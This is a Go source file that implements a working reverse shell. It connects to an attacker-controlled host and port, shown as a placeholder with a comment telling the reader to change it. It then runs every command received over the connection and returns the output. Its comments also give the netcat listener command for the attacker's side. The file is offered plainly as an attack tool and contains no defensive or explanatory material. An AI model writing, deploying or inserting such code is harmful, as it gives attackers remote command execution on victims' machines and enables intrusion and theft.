package main

// Import dependencies
import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)

// main Main entry point to reverse shell
func main() {

	// Dial a connection back to attacker machine on port 4444
	// On your Linux attack box with netcat setup the listener: nc -lvp 4444

	// CHANGE IP ADDRESS:PORT TO ATTACK MACHINE
	netConn, _ := net.Dial("tcp", "127.0.0.1:4444")

	for {

		// listen for commands coming from the connection to our target
		attackerCommand, _ := bufio.NewReader(netConn).ReadString('\n')

		// execute the command that is sent from the attacker and return the output from it
		commandOutput, err := exec.Command(strings.TrimSuffix(attackerCommand, "\n")).Output()

		if err != nil {
			// if an error happens send it back to attacker
			fmt.Fprintf(netConn, "%s\n", err)
		}
		// return output from command execution back to attacker
		fmt.Fprintf(netConn, "%s\n", commandOutput)

	}
}
